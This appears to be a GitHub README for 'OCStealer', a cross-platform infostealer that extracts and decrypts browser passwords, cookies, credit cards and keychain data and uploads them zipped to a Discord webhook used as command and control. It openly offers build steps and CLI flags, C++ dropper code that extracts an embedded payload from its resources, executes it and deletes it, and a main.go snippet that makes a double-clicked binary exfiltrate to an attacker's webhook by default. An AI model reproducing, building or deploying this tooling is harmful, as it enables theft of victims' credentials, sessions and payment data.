
# OCStealer — Browser Info Stealer Family

## Overview
October is a Go-based malware for extracting and decrypting browser data across Windows, macOS, and Linux. It supports multiple browsers (Chromium, Firefox, Safari) and retrieves passwords, cookies, bookmarks, history, downloads, extensions, and stored credentials and using Discord as a C2

## Features
- **Multi-browser support**: Chrome, Edge, Chromium, Firefox, Safari, Brave, Vivaldi
- **Cross-platform**: Windows (DPAPI), macOS (Keychain), Linux (DBus)
- **Data extraction**:
  - Passwords & master keys
  - Cookies & storage
  - Bookmarks & history
  - Downloads & extensions
  - Credit card information
- **Output formats**: JSON, CSV, Cookie Editor
- **Compression & export**: ZIP compression and Discord webhook uploads

## Build
```bash
# Requirements: Go 1.20+
go mod tidy
go build ./cmd/OctoberStealer
```

## Usage
```bash
Usage:
  OctoberBrowserStealer [flags]
  OctoberBrowserStealer [command]

Available Commands:
  dump        Extract and decrypt browser data (default command)
  help        Help about any command
  keys        Manage cross-host master keys
  list        List detected browsers and profiles
  version     Print version information

Flags:
  -b, --browser string           target browser: all|360|360x|arc|brave|chrome|chrome-beta|chromium|coccoc|dc|duckduckgo|edge|firefox|opera|opera-gx|qq|sogou|vivaldi|yandex (default "all")
  -c, --category string          data categories (comma-separated): all|password,cookie,bookmark,history,download,creditcard,extension,localstorage,sessionstorage (default "all")
  -d, --dir string               output directory (default "results")
      --discord-webhook string   Discord webhook URL to upload zip
  -f, --format string            output format: csv|json|cookie-editor (default "json")
  -h, --help                     help for OctoberBrowserStealer
      --keychain-pw string       macOS keychain password
  -p, --profile-path string      custom profile dir path, get with chrome://version
  -v, --verbose                  enable debug logging
      --zip                      compress output to zip

Use "OctoberBrowserStealer [command] --help" for more information about a command.

```

## Project Structure
- `browser/` — Browser data extraction modules
- `crypto/` — Decryption & key retrieval
- `types/` — Data models
- `output/` — Formatters (JSON, CSV, etc.)
- `cmd/OctoberStealer/` — CLI entry point
- `utils/` — Platform-specific utilities
- `log/` — Logging

## Dependencies
- `github.com/spf13/cobra` — CLI framework
- `modernc.org/sqlite` — SQLite support
- `golang.org/x/sys` — System calls
- Platform-specific: binarycookies (Safari), keychainbreaker (macOS), plist (macOS)

# Notes
### Host Executable Payload Embedding and Extraction
##  Extraction Phase (Runtime)

When the host executable runs, it performs the following steps to reconstruct and execute the payload:

1.  **Read:** The host locates and reads the embedded data from its own resources using `FindResource()` and `LoadResource()`.
2.  **Extract:** The raw binary data is carved out and written to a temporary location on the disk using `CreateFile()` and `WriteFile()`.
3.  **Execute:** The newly created temporary file is launched as a new process using `CreateProcess()`.
4.  **Monitor & Clean up:** The host uses `OpenProcess()` to get a handle to the running payload, waits for it to exit via `WaitForSingleObject()`, and then safely deletes the temporary file using `DeleteFile()`.

---

##  Example (C++)

Below is a conceptual implementation demonstrating the extraction, execution, and tracking of the payload using `OpenProcess`.

```cpp
#include <windows.h>
#include <iostream>

#define IDR_PAYLOAD_EXE 101

int main() {
    
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(IDR_PAYLOAD_EXE), RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hData = LoadResource(hModule, hRes);
    LPVOID pBuffer = LockResource(hData);
    DWORD dwSize = SizeofResource(hModule, hRes);

    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "PL", 0, tempFile); 
    HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD dwBytesWritten;
    WriteFile(hFile, pBuffer, dwSize, &dwBytesWritten, NULL);
    CloseHandle(hFile);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        
        HANDLE hProcessTrack = OpenProcess(PROCESS_QUERY_INFORMATION | SYNCHRONIZE, FALSE, pi.dwProcessId);
        
        if (hProcessTrack != NULL) {
          WaitForSingleObject(hProcessTrack, INFINITE);
            CloseHandle(hProcessTrack);
        }
        
        CloseHandle(pi.hProcess);
    }

    DeleteFileA(tempFile);
    
    return 0;
}
```

## important : default args in main.go file

``` bash
func main() {
	configureDoubleClickMode()
	if len(os.Args) == 1 {
		os.Args = []string{
			os.Args[0],
			"--discord-webhook",
			"", // [*]  add your discord web hook here
			"--zip",
		}
	}
```

<p align="center">
  <img src="https://raw.githubusercontent.com/Hollow33n/OCStealer/main/ChatGPT%20Image%20Jun%2028%2C%202026%2C%2004_15_36%20AM.png" alt="OCStealer Screenshot" width="250">
</p>
